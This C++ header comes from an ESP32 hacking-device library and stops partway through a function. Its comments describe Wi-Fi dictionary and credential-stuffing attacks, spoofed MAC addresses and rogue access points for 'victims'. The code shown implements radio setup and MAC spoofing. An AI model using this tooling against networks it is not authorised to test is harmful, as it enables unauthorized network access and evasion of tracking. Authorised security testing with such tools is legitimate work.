/**
*     _  _         _____                     _______  _ 
*    ( )( (    /| / ___ \ |\     /||\     /|(  ____ \( )
*    | ||  \  ( |( (   ) )( \   / )| )   ( || (    \/| |
*    (_)|   \ | |( (___) | \ (_) / | |   | || (_____ (_)
*     _ | (\ \) | \____  |  ) _ (  | |   | |(_____  ) _ 
*    ( )| | \   |      ) | / ( ) \ | |   | |      ) |( )
*    | || )  \  |/\____) )( /   \ )| (___) |/\____) || |
*    (_)|/    )_)\______/ |/     \|(_______)\_______)(_)
*                                                       
*/
/*  
*  Nyxus Source-Available Non-Derivative License
*  Copyright (c) 2026 Yazdan Samari
*  Permission is hereby granted, free of charge, to any person obtaining a copy
*  of this software and associated documentation files (the "Software"), to use
*  and compile the Software for personal or internal purposes, subject to the 
*  following conditions:
*  1. NO MODIFICATION: You may not modify, alter, translate, or create derivative 
*     works of the Software.
*  2. NO REDISTRIBUTION OF MODIFIED COPIES: You may not publish, distribute, 
*     sublicense, or sell modified versions of the Software.
*  3. ATTRIBUTION: The above copyright notice and this permission notice shall be 
*     included in all copies or substantial portions of the Software.
*  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
*  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
*  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
*  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
*  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
*  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
*  SOFTWARE.
*/
#pragma once
#ifndef _NEXUS_WIFI_HPP_
#define _NEXUS_WIFI_HPP_

#include <string_view>
#include <string>
#include <cstring>
#include <cstdint>
#include <array>
#include <vector>
#include <algorithm>
#include <Nyxus/nyx_terminal_graphics.hpp>
#include <Nyxus/nyx_network_types.hpp>
#include <Nyxus/nyx_file_parser.hpp>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_event.h>
#include <esp_wifi_types.h>
#include <lwip/ip_addr.h>
#include <lwip/def.h>
#include <nvs_flash.h>
#include <freertos/event_groups.h>
#include <RTClib.h>

/**
* @class NYXUS_WIFI
* @brief Core network manager handling radio state, connection polling, and low-level hardware overrides.
*/
class NYXUS_WIFI{
   public:
   friend class NYXUS_FILE_PARSER;

   protected:
   /**
   * @brief Configuration profile for connecting to a network.
   */
   ConnectionConfig config;

   protected:
   /**
    * @brief Fixed-width buffer preventing dynamic string allocation. 64 bytes safely covers maximum WPA2/WPA3 password lengths.
    */
   using NyxPayload = std::array<char, 64>;

   protected:
   /**
    * @brief Contiguous memory block for a target network and its payloads.
    */
   struct TargetDictionary {
      std::array<char, 33> ssid; // IEEE 802.11 max SSID length (32) + Null Terminator
      std::vector<NyxPayload> payloads;
      TargetDictionary(std::string_view target_ssid) { // Constructor to safely copy the SSID string
         ssid.fill('\0');
         size_t copy_len = std::min(target_ssid.length(), (size_t)32);
         memcpy(ssid.data(), target_ssid.data(), copy_len);
      }
   };

   protected:
   /** * @brief Zero-Fragmentation memory arena replacing the unordered_map.
    * Only allocates exactly one contiguous block of heap memory per network.
    */
   std::vector<TargetDictionary> Targets;

   protected:
   /**
   * @brief Pointer to the Real-Time Clock module for accurate telemetry logging.
   */
   RTC_DS3231* rtc_ptr = nullptr;

   protected:
   /**
   * @brief Pointer to the SD card.
   */
   SdFat* sd = nullptr;

   protected:
   /**
    * @brief Function pointer to the main UI/Terminal tick function.
    * @paragraph Non-Blocking Architecture
    * Called repeatedly during heavy blocking operations (like waiting for a router handshake) 
    * to ensure the graphical interface and input matrix never freeze.
    */
   void (*ui_yield_callback)() = nullptr;

   protected:
   /**
   * @brief Internal pointer to the ESP-IDF Station (Client) Network Interface.
   * @paragraph Architectural Context
   * In ESP-IDF, the physical Wi-Fi radio is separated from the TCP/IP stack (LwIP). 
   * This `esp_netif_t` object acts as the bridge connecting the LwIP network interface to the 
   * physical station-mode hardware. It is required to assign static IPs, manipulate DHCP clients, 
   * and read local MAC addresses directly from the silicon.
   */
   esp_netif_t* sta_netif = nullptr;

   protected:
   /**
   * @brief Internal pointer to the ESP-IDF Access Point Network Interface.
   * @paragraph Architectural Context
   * Similar to the Station interface, this binds the hardware's AP broadcasting capabilities to the 
   * LwIP stack. It manages the DHCP server that assigns IP addresses to devices connecting to your 
   * rogue AP or localized network.
   */
   esp_netif_t* ap_netif = nullptr;

   protected:
   /**
   * @brief FreeRTOS Event Group Handle for asynchronous network state tracking.
   * @paragraph Asynchronous Operations
   * To achieve O(1) non-blocking hardware operations, the cyberdeck utilizes FreeRTOS event groups. 
   * Instead of using a standard `while()` loop to check `WiFi.status()` which blocks the CPU, 
   * the OS sets bits within this group the moment a physical hardware interrupt occurs, allowing 
   * parallel thread execution without polling.
   */
   EventGroupHandle_t wifi_event_group = nullptr;

   protected:
   /**
   * @brief Bitmask flag representing a successful IP assignment from a target router.
   */
   static constexpr int32_t WIFI_CONNECTED_BIT = 0x00000001;

   protected:
   /**
   * @brief Bitmask flag representing a failed connection or exhausted retry threshold.
   */
   static constexpr int32_t WIFI_FAIL_BIT      = 0x00000002;

   protected:
   /**
   * @brief Counter tracking the current number of sequential authentication failures.
   * @paragraph Brute-Force Safety
   * Used exclusively within the asynchronous `wifi_event_handler`. It tracks how many times the 
   * silicon has attempted to handshake with a router. Once this hits `config.retry_amount`, the 
   * hardware gracefully aborts to prevent infinite loop lockups.
   */
   uint8_t current_retry_count = 0;

   protected:
   /** 
   * @brief Enables verbosity.
   */
   bool verbose;

   protected:
   /** 
   * @brief Enables Timestamping.
   */
   bool timestampEnabled;

   private:
   /**
   * @brief Baremetal ESP-IDF Event Handler. Catches hardware interrupts for Wi-Fi and IP assignment.
   * @param arg Void pointer cast back to the `NYXUS_WIFI` instance.
   * @param event_base The core ESP-IDF event domain (e.g., WIFI_EVENT or IP_EVENT).
   * @param event_id The specific hardware trigger (e.g., STA_DISCONNECTED).
   * @param event_data Pointer to the raw payload associated with the event.
   * @paragraph Event-Driven Architecture
   * Pure ESP-IDF is written in standard C, it cannot natively execute C++ class methods. 
   * This function is declared `static` to provide a raw C-pointer to the FreeRTOS OS. By passing 
   * `this` into the handler's argument during registration, we seamlessly bridge the C/C++ boundary, 
   * allowing the C-interrupt to mutate our C++ class variables in real-time.
   */
   static void wifi_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data);

   public:
   /**
   * @brief Instantiates the Nyxus Network Interface.
   * @param toggleVerbosity Enables detailed serial telemetry output.
   * @param timestamp Enables timestamping on files.
   * @param Conconfig Optional configuration payload for timing/IP limits. Uses default safety parameters if omitted.
   * @param scanConfig Optional configuration payload for timing/IP limits. Uses default safety parameters if omitted.
   */
   NYXUS_WIFI(
      bool toggleVerbosity = true, 
      bool timestamp = true,
      SdFat* disk = nullptr,
      RTC_DS3231* rtc_module = nullptr,
      ConnectionConfig Conconfig = {
         .connection_wait_time_ms = 200,
         .ip1     = ESP_IP4TOUINT32(0, 0, 0, 0),
         .gateway = ESP_IP4TOUINT32(0, 0, 0, 0),
         .subnet  = ESP_IP4TOUINT32(0, 255, 255, 255),
         .dns1    = ESP_IP4TOUINT32(0, 0, 0, 0),
         .dns2    = ESP_IP4TOUINT32(0, 0, 0, 0),
         .retry_amount = 5
      }): timestampEnabled(timestamp), verbose(toggleVerbosity), config(Conconfig), Targets(), sd(disk), rtc_ptr(rtc_module) {};

   private:
   /**
    * @brief Dumps the current hardware radio state, IP routing, and physical telemetry to the Serial console.
    * @note Replaces Arduino state lookups entirely with native ESP-IDF driver structures.
    * @paragraph Architectural Execution
    * This function directly requests operational metrics from both the physical layer (RF transceiver status, RSSI, channel indexes) 
    * and the virtual network routing layer (the raw LwIP network interface handles). It queries memory state elements without triggering blocking locks.
    * @return void
    */
   inline void display_info();

   public:
   /**
    * @brief Mutates the ESP32 hardware radio state to target operational boundaries.
    * @param mode The target layout setting (WIFI_MODE_STA, WIFI_MODE_AP, WIFI_MODE_APSTA, or WIFI_MODE_NULL).
    * @paragraph State Transition Protocols
    * This function intercepts the physical operation parameters of the radio and updates the internal state structures 
    * via the underlying hardware driver loop (`esp_wifi_set_mode`). By modifying this setting at runtime, the compiler avoids 
    * tearing down the upper-level network interface maps, allowing instant re-routing paths.
    * @return void
    */
   inline void ChangeMode(const wifi_mode_t &mode);
   
   public:
   /**
   * @brief Injects a custom or randomized MAC address directly into the underlying ESP-IDF hardware layer.
   * @param new_mac Pointer to a 6-byte array containing the spoofed MAC. Pass `nullptr` to auto-generate an IEEE-compliant random MAC.
   * @warning The station configuration must NOT be connected, and the module cannot be actively broadcasting an AP when invoked.
   * @paragraph Silicon Address Alteration
   * This method pulls the original MAC straight out of the system registers via `esp_wifi_get_mac` before applying the new sequence. 
   * If `new_mac` is left empty, the built-in system RNG (`esp_fill_random`) crafts a new sequence. The address space is bit-masked 
   * with `0x02` to mark it as a Locally Administered Address (LAA), shielding the physical device vendor profile (OUI) from downstream trackers.
   * @return void
   */
   inline void ChangeMac(uint8_t* new_mac = nullptr);

   public:
   /**
    * @brief Registers the UI rendering function to be called during wait states.
    */
   inline void setYieldCallback(void (*callback_func)());

   private:
   /**
   * @brief prints the timestamp in 24 Hour format if timestamping is enabled.
   * @return void
   */
   inline void timestamp();

   private:
   /**
   * @brief Displays the configuration profile upon selecting `connective` mode or changing the configuration profile.
   * @return void
   */
   inline void displayConfig();

   public:
   /**
    * @brief Initializes the baremetal ESP-IDF networking stack and FreeRTOS event loops.
    * @attention Replaces standard Arduino boot sequence. Must be called once during OS startup.
    * @return void
    */
   inline void Kickstart();

   public:
   /**
    * @brief Disables current radio states and forces the silicon into a safe, offline baseline.
    * @param SavePayloads Saves the contents of the `SSIDs` into `db_folder_for_ssid_pswd` while avoiding duplication.
    * @param SaveConnectionConfiguration Saves the Connection Configuration profile into `db_folder_for_connection_config`
    * @param db_folder_for_ssid_pswd Path for contents of `SSIDs` to be saved.
    * @param db_folder_for_connection_config Path for contents of `config` to be saved.
    * @attention Must be called before system Shutdown to clear ghost connections from previous sessions, save and avoid interfering with other modules.
    * @warning Not saving the data will cause it to be erased entirely with no ways of restoration.
    * @return void
    */
   inline void Kill(bool SavePayloads = false, bool SaveConnectionConfiguration = false, const std::string& db_folder_for_ssid_pswd = "", const std::string& db_folder_for_connection_config = "");

   public: 
   /**
   * @brief Changes the connection configuration
   * @param conf The Configuration struct 
   * @return void
   */
   inline void ChangeConnectionConfig(const ConnectionConfig &conf);

   public:
   /**
    * @brief Adds a target SSID and a corresponding password payload to the internal dictionary map.
    * @param SSID The target network name.
    * @param PSWD The password payload to associate.
    * @return void
    */
   inline void Add_SSID_PSWD(std::string_view SSID, std::string_view PSWD);

   public:
   /**
    * @brief Purges a specific password payload from a target SSID in the dictionary map.
    * @param SSID The target network name.
    * @param PSWD The specific password payload to remove.
    * @return void
    */
   inline void Remove_SSID_PSWD(std::string_view SSID, std::string_view PSWD);

   public:
   /**
    * @brief Completely wipes a target SSID and all its associated passwords from the dictionary map.
    * @param SSID The target network name to remove.
    * @return void
    */
   inline void Remove_SSID(std::string_view SSID);

   public:
   /**
    * @brief Delegates target dictionary loading to the hardware parser.
    * @param SSID The exact target network name.
    * @param db_folder The absolute root directory path for payload databases.
    * @param showAtteptPswd If true, streams the active payload loads to the Serial console.
    * @param limit Maximum number of unique payloads to load into SRAM. Prevents memory fragmentation on massive files.
    * @return void
    */
   inline void LoadSSID(std::string_view SSID, std::string_view db_folder, bool showAtteptPswd = false, uint64_t limit = UINT64_MAX);

   public:
   /**
    * @brief Serializes a specific target's SRAM dictionary to the SD card up to a defined payload limit.
    * @param SSID The exact target network name.
    * @param db_folder The absolute root directory path for payload databases.
    * @param safeDump When true, cross-references existing SD payloads to prevent appending duplicates.
    * @param limit Maximum number of payloads to write to the physical disk.
    * @return void
    */
   inline void DumpSSID(std::string_view SSID, std::string_view db_folder, bool safeDump = true, uint64_t limit = UINT64_MAX);

   public:
   /**
    * @brief Forcefully appends a singular, exact password payload to a target's SD card database.
    * @param SSID The exact target network name.
    * @param PSWD The specific payload to append.
    * @param db_folder The absolute root directory path for payload databases.
    * @param safeDump If true, scans the target file first to prevent injecting a duplicate payload.
    * @return void
    */
   inline void Dump_Exact_SSID_PSWD(std::string_view SSID, std::string_view PSWD, std::string_view db_folder, bool safeDump = true);

   public:
   /**
    * @brief Searches the SD card for an exact password payload and loads it into SRAM if verified.
    * @param SSID The exact target network name.
    * @param PSWD The specific payload to verify and load.
    * @param db_folder The absolute root directory path for payload databases.
    * @return void
    */
   inline void Load_Exact_SSID_PSWD(std::string_view SSID, std::string_view PSWD, std::string_view db_folder);

   private:
   /**
    * @brief Baremetal LwIP network interface handshake sequence.
    * @param ssid Null-terminated target network name.
    * @param pswd Null-terminated password payload.
    * @paragraph Event-Driven Execution
    * This replaces the blocking `WiFi.begin()` delays. It compiles the target credentials directly into 
    * the ESP-IDF `wifi_config_t` register. It then halts the DHCP client to inject the spoofed static IP 
    * (if provided). Finally, it puts the thread to sleep (`xEventGroupWaitBits`) yielding the CPU back to the OS 
    * until the hardware interrupt handler explicitly wakes it with a success or failure bitmask.
    * @return True if target breached and IP assigned. False if hardware exhausted retries.
    */
   [[nodiscard]] inline bool execute_hardware_handshake(std::string_view ssid, std::string_view pswd);

   public:
   /**
   * @brief Attempts to connect to ANY network currently saved inside the internal dictionary map.
   * @param showAtteptPswd If true, prints the explicit password being tested to the Serial console.
   * @attention This overload operates sequentially and is designed for automated credential stuffing/brute-forcing.
   * @return void
   */
   inline void Connect(bool showAtteptPswd = false);

   public:
   /**
   * @brief Forcefully attempts a connection to a specific SSID using a singular password payload.
   * @param SSID The exact target network name.
   * @param PSWD The password payload to test.
   * @param showAtteptPswd If true, echoes the attempt parameters to the Serial console.
   * @param save If true, automatically injects this combination into the internal dictionary map upon success.
   * @return void
   */
   inline void Connect(std::string_view SSID, std::string_view PSWD, bool showAtteptPswd = false, bool save = false);

   public:
   /**
   * @brief Executes a targeted credential-stuffing sequence against a specific SSID using its associated payload dictionary.
   * @param SSID The exact target network name to authenticate against.
   * @param showAtteptPswd If true, streams the active password payload attempts to the Serial console in real-time.
   * @attention The target SSID must exist within the internal dictionary map; otherwise, the execution aborts automatically to prevent memory faults.
   * @return void
   */
   inline void Connect(std::string_view SSID, bool showAtteptPswd = false);

   public:
   /**
   * @brief Executes a zero-RAM-bloat dictionary attack utilizing the FAT32 filesystem as an O(1) index map.
   * @param SSID The exact target network name.
   * @param db_folder The root directory on the SD card containing the SSID payload files (e.g., "/payloads").
   * @param showAtteptPswd If true, streams the active payload attempts to the Serial console in real-time.
   * @attention The SD card must contain a file named exactly `<SSID>.ssidpswd` inside the target directory.
   * @return void
   */
   inline void Connect(std::string_view SSID, std::string_view db_folder, bool showAtteptPswd = false);

   public:
   /**
    * @brief Serializes the active payload dictionary from SRAM to persistent FAT32 storage.
    * @param db_folder The absolute root directory path for payload databases.
    * @param safeDump When true, performs a pre-read to prevent writing duplicate payload entries into existing targets.
    * @attention Disabling safeDump forces a destructive overwrite (TRUNC) on existing database files, but executes significantly faster.
    * @return void
    */
   inline void DumpSSIDs(std::string_view db_folder, bool safeDump = true);

   public:
   /**
   * @brief Loads the connection configuration profile via the hardware parser.
   * @param path The absolute path of the .connconf file.
   * @return void
   * @attention The file extension MUST be `.connconf`.
   */
   inline void LoadConnectionConfig(std::string_view path);

   public:
   /**
    * @brief Serializes the active Connection Configuration Profile from SRAM to persistent FAT32 storage.
    * @param path The absolute root directory path for payload databases.
    * @attention The path provided should also contain the Name of the file with `.scnconf` extension
    * @note The file will be written according to the rules declared in `nyx_file_parser.hpp`
    * @return void
    */
   inline void SaveConnectionConfig(std::string_view path);

   public:
   /**
    * @brief Purges current network connection parameters and restores standard hardware defaults.
    * @return void
    */
   inline void ResetConnectionConfig();

   public:
   /**
    * @brief Surgically excises an exact password payload via an O(1) memory file-swap algorithm.
    * @param SSID The exact target network name.
    * @param PSWD The specific payload to remove.
    * @param db_folder The absolute root directory path for payload databases.
    * @return void
    */
   inline void Remove_Exact_SSID_PSWD_From_SD(std::string_view SSID, std::string_view PSWD, std::string_view db_folder);

   private:
   /**
    * @brief Internal hardware method to destroy a file on the FAT32 volume.
    * @param filepath The absolute path of the file.
    * @return void
    */
   inline void DestroyFile(std::string_view filepath);

   public:
   /**
    * @brief Permanently deletes an entire SSID payload database from the SD card.
    * @param SSID The exact target network name.
    * @param db_folder The absolute root directory path for payload databases.
    * @return void
    */
   inline void Delete_SSID_Database(std::string_view SSID, std::string_view db_folder);

   public:
   /**
    * @brief Permanently deletes a specific connection configuration file from the SD card.
    * @param path The absolute path to the `.connconf` file (excluding extension).
    * @return void
    */
   inline void Delete_ConnectionConfig(std::string_view path);

   public:
   /**
    * @brief Stages target credentials into the physical silicon without executing a connection.
    * @param ssid The target network name.
    * @param pswd The target password (leave empty for OPEN networks).
    * @paragraph Hardware Staging
    * Useful for pre-loading the Wi-Fi registers during OS boot sequences, allowing 
    * a simple `esp_wifi_connect()` later to execute instantly without string parsing overhead.
    * @return void
    */
   inline void StageTarget(const char* ssid, const char* pswd = "");

   public:
   /**
    * @brief Configures the hardware to broadcast an Access Point (Assertive Mode).
    * @param ssid The network name to broadcast to victims/users.
    * @param pswd The password for the AP (leave empty for an OPEN network).
    * @param channel The 802.11 Wi-Fi channel to broadcast on (1-13).
    * @param hidden If true, drops the SSID from beacon frames, hiding it from standard network scans.
    * @param max_connections Maximum allowed client devices (ESP32 silicon maximum is typically 10).
    * @param ipconf The ip that the network be spoofed as. Dont touch if not running mitm or injections
    * @return void
    */
   inline void HostNetwork(const char* ssid, const char* pswd = "", uint8_t channel = 6, bool hidden = false, uint8_t max_connections = 4, const ForgedIPConfig& ipconf = {});

   private:
   /**
    * @brief Translates hardware-level encryption enumerators into human-readable strings.
    * @param authMode The raw `wifi_auth_mode_t` enum returned by the ESP32 silicon.
    * @return A constant character pointer representing the encryption protocol.
    */
   static inline const char* translateEncryption(const wifi_auth_mode_t &authMode);
};

/* IMPLEMENTATIONS - NOTHING HERE */

inline void NYXUS_WIFI::wifi_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
   NYXUS_WIFI* wifi_instance = static_cast<NYXUS_WIFI*>(arg);
   if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
      if (wifi_instance->current_retry_count < wifi_instance->config.retry_amount) {
         esp_wifi_connect();
         wifi_instance->current_retry_count++;
      } else {
         xEventGroupSetBits(wifi_instance->wifi_event_group, WIFI_FAIL_BIT);
      }
   } 
   else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
      wifi_instance->current_retry_count = 0;
      xEventGroupSetBits(wifi_instance->wifi_event_group, WIFI_CONNECTED_BIT);
   }
}

inline void NYXUS_WIFI::display_info(){
   wifi_mode_t currentMode;
   if (esp_wifi_get_mode(&currentMode) != ESP_OK) {
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] Failed to fetch current radio mode.\n", Color::RED, Color::RESET); }
      return;
   }
   Serial.printf("==========%sWIFI INFO%s==========\n", Color::YELLOW, Color::RESET);
   uint8_t mac[6];
   char macStr[18];
   switch (currentMode){
      case WifiMode::passive:
      case WifiMode::connective: {
         esp_wifi_get_mac(WIFI_IF_STA, mac);
         snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
         wifi_ap_record_t ap_info;
         esp_err_t err = esp_wifi_sta_get_ap_info(&ap_info);
         esp_netif_ip_info_t ip_info;
         esp_netif_get_ip_info(sta_netif, &ip_info);
         char ipStr[16], gwStr[16];
         esp_ip4addr_ntoa(&ip_info.ip, ipStr, sizeof(ipStr));
         esp_ip4addr_ntoa(&ip_info.gw, gwStr, sizeof(gwStr));
         Serial.printf("--- %sCLIENT MODE (STA)%s ---\n", Color::TEAL, Color::RESET);
         if (err == ESP_OK) {
            Serial.printf("Connected to SSID: %s%s%s\n", Color::MAGENTA, ap_info.ssid, Color::RESET);
            timestamp(); Serial.printf("Signal (RSSI): %s%d dBm%s\n", Color::WHITE, ap_info.rssi, Color::RESET);
            timestamp(); Serial.printf("Channel: %s%d%s\n", Color::BROWN, ap_info.primary, Color::RESET);
            timestamp(); Serial.printf("Encryption Type: %s%s%s\n", Color::GREEN, translateEncryption(ap_info.authmode), Color::RESET);
         } 
         else {
            timestamp(); Serial.printf("Status: %sDisconnected / Idle%s\n", Color::RED, Color::RESET);
         }
         timestamp(); Serial.printf("Assigned IPv4: %s%s%s\n", Color::ORANGE, ipStr, Color::RESET);
         timestamp(); Serial.printf("Hardware MAC: %s%s%s\n", Color::YELLOW, macStr, Color::RESET);
         if (currentMode != WifiMode::passive) break;
      }
      case WifiMode::assertive: {
         esp_wifi_get_mac(WIFI_IF_AP, mac);
         snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
         wifi_config_t ap_config;
         esp_wifi_get_config(WIFI_IF_AP, &ap_config);
         esp_netif_ip_info_t ip_info;
         esp_netif_get_ip_info(ap_netif, &ip_info);
         char ipStr[16];
         esp_ip4addr_ntoa(&ip_info.ip, ipStr, sizeof(ipStr));
         wifi_sta_list_t sta_list;
         esp_wifi_ap_get_sta_list(&sta_list);
         Serial.printf("--- %sHOST MODE (AP)%s ---\n", Color::TEAL, Color::RESET);
         timestamp(); Serial.printf("Broadcasting SSID: %s%s%s\n", Color::MAGENTA, ap_config.ap.ssid, Color::RESET);
         timestamp(); Serial.printf("Gateway IPv4: %s%s%s\n", Color::ORANGE, ipStr, Color::RESET);
         timestamp(); Serial.printf("Host MAC: %s%s%s\n", Color::YELLOW, macStr, Color::RESET);
         timestamp(); Serial.printf("Number of connected devices: %s%d%s\n", Color::GREEN, sta_list.num, Color::RESET);
         break;
      }
      case WifiMode::off: {
         Serial.printf("--- %sOFF MODE%s ---\n", Color::TEAL, Color::RESET);
         break;
      }
      default: {
         timestamp(); Serial.printf("[%sERROR%s] Invalid Mode State encountered.\n", Color::RED, Color::RESET);
         break;
      }
   }
   Serial.println("=============================");
}

inline void NYXUS_WIFI::ChangeMode(const wifi_mode_t &mode){
   if (verbose) Serial.println("Select the Wifi Mode:");
   esp_err_t err = esp_wifi_set_mode(mode);
   if (err != ESP_OK) {
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] Failed to change Wi-Fi mode. Code: %d\n", Color::RED, Color::RESET, err); }
      return;
   }
   switch (mode){
      case WIFI_MODE_STA:{
         if (verbose){
            timestamp(); Serial.printf("[%sINFO%s] Wifi Mode has been successfully set to Connective (STA).\n", Color::YELLOW, Color::RESET);
            Serial.println("====== Connection profile ======");
            displayConfig();
            Serial.println("================================");
         }
         break;
      }
      case WIFI_MODE_AP:{
         if (verbose){
            timestamp(); Serial.printf("[%sINFO%s] Wifi Mode has been successfully set to Assertive (AP).\n", Color::YELLOW, Color::RESET);
         }
         break;
      }
      case WIFI_MODE_APSTA:{
         if (verbose){
            timestamp(); Serial.printf("[%sINFO%s] Wifi Mode has been successfully set to Passive (APSTA).\n", Color::YELLOW, Color::RESET);
         }
         break;
      }
      case WIFI_MODE_NULL:{
         if (verbose){
            timestamp(); Serial.printf("[%sINFO%s] Wifi Mode has been successfully set to Off.\n", Color::YELLOW, Color::RESET);
         }
         break;
      }
      default:{
         esp_wifi_set_mode(WIFI_MODE_NULL);   
         timestamp(); Serial.printf("[%sERROR%s] Invalid Mode payload provided.\n", Color::RED, Color::RESET);
         timestamp(); Serial.printf("[%sINFO%s] Wifi Turned Off for safety.\n", Color::YELLOW, Color::RESET);   
         break;
      }   
   }
}

inline void NYXUS_WIFI::ChangeMac(uint8_t* new_mac){
   wifi_mode_t currentMode;
   esp_wifi_get_mode(&currentMode);
   EventBits_t bits = xEventGroupGetBits(wifi_event_group);
   bool isConnected = (bits & WIFI_CONNECTED_BIT) != 0;
   if (isConnected || currentMode == WIFI_MODE_AP || currentMode == WIFI_MODE_APSTA){
      if (verbose) {
         timestamp(); Serial.printf("[%sERROR%s] Could not Change MAC address due to active connection or hosting profiles.\n", Color::RED, Color::RESET);
      }
      return;
   }
   uint8_t current_mac[MAC_SIZE];
   esp_wifi_get_mac(WIFI_IF_STA, current_mac);
   char currMacStr[18];
   snprintf(currMacStr, sizeof(currMacStr), "%02X:%02X:%02X:%02X:%02X:%02X", current_mac[0], current_mac[1], current_mac[2], current_mac[3], current_mac[4], current_mac[5]);
   uint8_t random_mac[MAC_SIZE];
   if (new_mac == nullptr){
      esp_fill_random(random_mac, MAC_SIZE);
      random_mac[0] = (random_mac[0] & 0xFC) | 0x02;
      new_mac = random_mac;
   }
   esp_err_t err = esp_wifi_set_mac(WIFI_IF_STA, new_mac);
   if (verbose) {
      if (err == ESP_OK) {
         uint8_t verified_mac[MAC_SIZE];
         esp_wifi_get_mac(WIFI_IF_STA, verified_mac);
         char newMacStr[18];
         snprintf(newMacStr, sizeof(newMacStr), "%02X:%02X:%02X:%02X:%02X:%02X", verified_mac[0], verified_mac[1], verified_mac[2], verified_mac[3], verified_mac[4], verified_mac[5]);
         timestamp(); Serial.printf("[%sWIFI%s] MAC Address spoofed successfully from %s to %s%s%s\n", 
            Color::GREEN, Color::RESET, currMacStr, Color::YELLOW, newMacStr, Color::RESET);
      } else {
         timestamp(); Serial.printf("[%sERROR%s] Failed to spoof MAC address. Hardware Code: %d\n", Color::RED, Color::RESET, err);
      }
   }
}

inline void NYXUS_WIFI::setYieldCallback(void (*callback_func)()) {
   ui_yield_callback = callback_func;
}

inline void NYXUS_WIFI::timestamp(){
   if (!timestampEnabled) return;
   DateTime now = rtc_ptr->now();
   Serial.printf("[%s%d-%d-%d %d:%d:%d%s] ", Color::CYAN, now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second(), Color::RESET);
}

inline void NYXUS_WIFI::displayConfig(){
   if (verbose){
      char buf_ip[16]; char buf_gw[16]; char buf_sub[16]; char buf_d1[16]; char buf_d2[16];
      ipToStr(config.ip1, buf_ip, sizeof(buf_ip));
      ipToStr(config.gateway, buf_gw, sizeof(buf_gw));
      ipToStr(config.subnet, buf_sub, sizeof(buf_sub));
      ipToStr(config.dns1, buf_d1, sizeof(buf_d1));
      ipToStr(config.dns2, buf_d2, sizeof(buf_d2));
      Serial.printf("IP address: %s%s%s\n", Color::GREEN, buf_ip, Color::RESET);
      Serial.printf("Gateway: %s%s%s\n", Color::YELLOW, buf_gw, Color::RESET);
      Serial.printf("Subnet mask: %s%s%s\n", Color::ORANGE, buf_sub, Color::RESET);
      Serial.printf("DNS primary: %s%s%s\n", Color::MAGENTA, buf_d1, Color::RESET);
      Serial.printf("DNS secondary: %s%s%s\n", Color::CYAN, buf_d2, Color::RESET);
      Serial.printf("Wait time: %s%ums%s\n", Color::OLIVE, config.connection_wait_time_ms, Color::RESET);
      Serial.printf("Retry amount: %s%d%s\n", Color::BROWN, config.retry_amount, Color::RESET);
   }
}

inline void NYXUS_WIFI::Kickstart(){
   if (timestampEnabled){ rtc_ptr->begin(); }
   if (verbose) {
      Serial.println("===============================");
      timestamp(); Serial.printf("[%sWIFI%s] Booting baremetal ESP-IDF networking framework...\n", Color::YELLOW, Color::RESET);
   }
   esp_err_t ret = nvs_flash_init();
   if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
      nvs_flash_erase();
      nvs_flash_init();
   }
   esp_netif_init();
   esp_event_loop_create_default();
   if (sta_netif == nullptr) sta_netif = esp_netif_create_default_wifi_sta();
   if (ap_netif == nullptr) ap_netif = esp_netif_create_default_wifi_ap();
   if (wifi_event_group == NULL) {
      wifi_event_group = xEventGroupCreate();
      if (wifi_event_group == NULL) {
         if (verbose) {
            timestamp(); Serial.printf("[%sFATAL%s] FreeRTOS heap exhausted. Event group creation failed.\n", Color::RED, Color::RESET);
         }
         return;
      }
   }
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
   esp_wifi_init(&cfg);
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
   esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, this, NULL);
   esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &wifi_event_handler, this, NULL);
   esp_wifi_set_mode(WIFI_MODE_NULL);
   esp_wifi_start();
   esp_wifi_set_ps(WIFI_PS_NONE);
   if (verbose) {
      timestamp(); Serial.printf("[%sWIFI%s] Hardware interrupts registered. Radio primed.\n", Color::GREEN, Color::RESET);
      Serial.println("===============================");
   }
}

inline void NYXUS_WIFI::Kill(bool SavePayloads, bool SaveConnectionConfiguration, const std::string& db_folder_for_ssid_pswd, const std::string& db_folder_for_connection_config){
   if (verbose){
      Serial.println("===============================");
      timestamp(); Serial.printf("[%sINFO%s] Killing protocol initiated...\n", Color::YELLOW, Color::RESET);
   }
   esp_wifi_disconnect();
   esp_wifi_stop();
   esp_wifi_set_mode(WifiMode::off);
   esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, (esp_event_handler_t)&wifi_event_handler);
   esp_event_handler_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, (esp_event_handler_t)&wifi_event_handler);
   if (verbose){
      wifi_mode_t check_mode;
      esp_wifi_get_mode(&check_mode);
      if (check_mode == WifiMode::off){
